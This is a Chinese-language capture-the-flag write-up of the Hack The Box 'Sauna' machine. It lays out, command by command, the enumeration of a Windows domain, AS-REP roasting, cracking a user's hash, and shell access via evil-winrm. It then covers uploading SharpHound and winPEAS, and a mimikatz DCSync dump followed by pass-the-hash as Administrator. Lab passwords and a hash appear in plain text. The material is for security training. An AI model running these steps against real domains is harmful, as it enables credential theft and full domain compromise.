---
description: Easy / 枚举 / AS-REP Roasting / DCsync
---

# ✔️ Sauna

## 建立立足点

### 信息收集

* 使用Nmap对目标系统进行开放端口扫描：

```bash
nmap -sC -sV -p- -oA sauna 10.129.77.184 --open
```

<figure><img src="../../.gitbook/assets/1 (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 发现开放目标系统开放了80端口，查看后并没有发现什么特别有用的信息，但是发现了很多用户名，先收集起来也许后续会有用：

<figure><img src="../../.gitbook/assets/2 (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/4 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/3 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 对该80端口进行常规的隐藏文件/目录扫描，没什么收获：

```bash
gobuster dir -u http://10.129.77.184/ -w /usr/share/wordlists/dirb/common.txt
```

<figure><img src="../../.gitbook/assets/5 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* dirsearch也没有什么收获：

<figure><img src="../../.gitbook/assets/6 (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 使用多个工具尝试无密码登录SMB服务，倒是成功了，但是还是无收获：

```bash
smbclient -N -L 10.129.77.184
```

<figure><img src="../../.gitbook/assets/7 (9).png" alt=""><figcaption></figcaption></figure>

```bash
crackmapexec smb 10.129.77.184
```

<figure><img src="../../.gitbook/assets/8 (9).png" alt=""><figcaption></figcaption></figure>

* 使用ldapsearch针对目标的LDAP目录树进行遍历的域名查询，获取到：**DC=EGOTISTICAL-BANK,DC=LOCAL**

```bash
ldapsearch -x -H LDAP://10.129.95.180 -s base namingcontexts
```

<figure><img src="../../.gitbook/assets/9 (7).png" alt=""><figcaption></figcaption></figure>

* 再次进行递归查询，发现有用信息：**dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL**

```bash
ldapsearch -x -H LDAP://10.129.95.180 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' -s sub 
```

* 将收集到的所有用户名及其改写的变体制作成一个username.txt文件：

<figure><img src="../../.gitbook/assets/10 (7).png" alt=""><figcaption></figcaption></figure>

* 因为已经收集到一些专门针对目标系统的有效用户名，所以可以尝试使用kerbrute进行一下暴破，找到几个用户名：

```
./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL username.txt --dc 10.129.95.180
```

<figure><img src="../../.gitbook/assets/11 (6).png" alt=""><figcaption></figcaption></figure>

* 使用GetNPUsers.py从username.txt中找出易受攻击的用户hash:

```bash
./GetNPUsers.Py 'EGOTISTICAL-BANK.LOCAL/' -usersfile username.txt -format hashcat -outputfile hashes.aspro -dc-ip 10.129.95.180
```

<figure><img src="../../.gitbook/assets/12 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 从这个hash中得知是fsmith这个账户的，破解该hash后获得明文密码：**Thestrokes23**

<figure><img src="../../.gitbook/assets/13 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/14 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/15 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### GET SHELL

* 使用evil-winrm和刚才得到的有效凭证，登录目标系统成功获得shell：

```bash
evil-winrm -i 10.129.95.180 -u fsmith -p Thestrokes23
```

<figure><img src="../../.gitbook/assets/16 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/17 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## 权限提升

### 本地信息收集

* 因为systeminfo.exe程序在目标中被限制，所以无法获得信息。随后枚举域内用户账户，得到6个账户：

```bash
net user /domain
# 分别枚举这6个账户名，查看它们的组成员关系：
net user fsmith /domain
```

<figure><img src="../../.gitbook/assets/18 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/19 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/20 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/21 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/22 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/23 (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/24 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 因为常规的手动枚举并没有什么其他有用信息，所以决定使用bloodhound对该机器的所有信息进行分析，此时继续使用evil-winrm的upload模块，上传sharphound.exe到目标机器中进行信息收集：

```bash
# evil-winrm：
upload /root/Documents/HTB-AD/sauna/tools/sharphound.exe
# 上传完成后直接运行即可，后续会生成一个zip文件：
.\sharphound.exe
```

<figure><img src="../../.gitbook/assets/25 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/26 (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/27 (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* 将这个压缩文件下载下来，直接拖入Bloodhound里就行了：

```bash
# evil-winrm:
download 20240713.............._BloodHound.zip
```

<figure><img src="../../.gitbook/assets/28 (1) (1).png" alt=""><figcaption></figcaption></figure>

* 在查看SVC\_LOANMGR@EGOTISTICAL-BANK.LOCAL这个账户时发现，该账户有权限访问目标域上的所有更改（GetChangesAll / GetChanges），这意味着我可以执行DCsync攻击：

<figure><img src="../../.gitbook/assets/29 (1) (1).png" alt=""><figcaption></figcaption></figure>

* 接下来继续使用evil-winrm上传winPEAS到目标中进行再次信息收集：

```bash
upload upload /root/Documents/HTB-AD/sauna/tools/winPEASx64.exe
```

<figure><img src="../../.gitbook/assets/30 (1) (1).png" alt=""><figcaption></figcaption></figure>

* 输出信息中包含了SVC\_LOANMGR账户的用户名和密码：

<figure><img src="../../.gitbook/assets/31 (1) (1).png" alt=""><figcaption></figcaption></figure>

### ROOT

* 利用svc\_loanmanager这个账户的凭证，用evil-winrm登录到目标中：

```bash
evil-winrm -i 10.129.82.224 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

<figure><img src="../../.gitbook/assets/32 (1) (1).png" alt=""><figcaption></figcaption></figure>

* 上传mimikatz到目标中，然后用DCsync攻击转储内置域管理员账户哈希：

```bash
# 上传：
upload Invoke-Mimikatz.ps1
# 使用mimikatz：
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:Egotistical-bank.local /user:Administrator"'
```

<figure><img src="../../.gitbook/assets/33 (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/34 (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/35 (1) (1).png" alt=""><figcaption></figcaption></figure>

* 获得Administrator账户及其hash值：

<figure><img src="../../.gitbook/assets/36 (1).png" alt=""><figcaption></figcaption></figure>

* 利用hash登录，获得Administrator权限的shell，至此已完全控制DC，get flag!

```bash
evil-winrm -i 10.129.82.224 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

<figure><img src="../../.gitbook/assets/37 (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/38 (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
本例机器中途重置后IP有变化，但其利用过程无影响。
{% endhint %}
